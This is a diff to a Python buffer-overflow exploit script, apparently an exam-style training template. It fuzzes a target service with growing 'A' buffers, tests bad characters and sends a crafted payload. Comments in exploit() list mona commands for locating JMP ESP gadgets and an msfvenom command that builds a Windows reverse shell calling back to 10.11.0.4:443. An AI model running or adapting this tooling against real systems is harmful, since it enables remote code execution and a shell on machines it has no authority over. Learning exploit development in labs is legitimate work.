@@ -27,7 +27,7 @@ target_port = 31337
 url = "http://" + target_host + ":" + str(target_port) + "/example"
 
 # Known bad characters
-badchars = [0x00, 0x0A] 
+badchars = [0x00, 0x0A, 0x0D] 
 
 # Only used with CHANNEL_TYPE_SOCKET
 socket_timeout = 3.0
@@ -171,23 +171,30 @@ def interactive():
 
 def detect_timeout():
     for i in range(EXPLOIT_TYPE_DETECT_TIMEOUT_MIN_BUFFER_SIZE, EXPLOIT_TYPE_DETECT_TIMEOUT_MAX_BUFFER_SIZE):
-        status = send_payload(("A" * i).encode("utf-8"))
+        value = i * 100
+        print("Trying: ", value)
+        status = send_payload(("A" * value).encode("utf-8"))
         if (status == STATUS_TIMEOUT or status == STATUS_ERROR):
+            print("Stopped at: ", value)
             break
 
 def exploit():
     # Compare badcharacter file with ESP:      !mona compare -a esp -f c:\badchar_test.bin
     # Find pattern within registers:           !mona findmsp
     # Payload generation:                      
-    #   msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f python –e x 86/shikata_ga_nai -b "\x00\x0a"
+    #   msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f python –e x 86/shikata_ga_nai -b "\x00\x0a"
     # NASM shell:                              msf-nasm_shell     metasm_shell.rb
     # Look for loaded DLLs:                    !mona modules
-    # Find witing a module:                    !mona find -s "\xff\xe4" -m "wcapwsp.dll"
-    # Find instruction:                        !mona jmp -r esp -cpb "\x00\x0A"
-    # Instructions:                            Debug 0xCC / Nop 0x90 / 0xCC
+    # Find witing a module:                    
+    #   JMP ESP:                               !mona find -s "\xff\xe4" -m "wcapwsp.dll"
+    #   PUSH ESP, RETN: 
+    # Find instruction:                        !mona jmp -r esp -cpb "\x00\x0A\0D"
+    # Find offset of instruction:              objdump -D -M intel user32.dll | grep 'jmp.*esp' | head
+    # Instructions:                            Debug - \xCC | Nop - \x90 | SUB ESP \x10 - \x83\xEC\x10
     # Exit functions:                          EXITFUNC=none / EXITFUNC=thread / EXITFUNC=process 
     # Usual bad-characters:                    00 0a
     # Nops or adjustment required due to - GetPC routine
+
 
     # ASCII strings (e.g. "ABCD") are stored front-to-back: "\x41\x42\x43\x44\x00"
     # Code (e.g. "NOP # NOP # NOP # RET") is stored front-to-back: "\x90\x90\x90\xC3"
@@ -210,7 +217,6 @@ def exploit():
 
     send_payload(buf)
 
-print(badchars)
 def main():
     print_header = True
     while True:
@@ -283,7 +289,11 @@ def main():
 
             except IndexError:
                 print("No removals")
-            payload = build_filler_payload(filler_splits) + badchar_test
+            if len(filler_splits) >= 1 and filler_splits[0].startswith("*"):
+                filler = b"A" * (int(filler_splits[0].split("*")[1]) - len(badchar_test))
+                payload = filler + badchar_test
+            else:
+                payload = build_filler_payload(filler_splits) + badchar_test
             send_payload(payload)
         elif (option.startswith("9")):
             exploit()
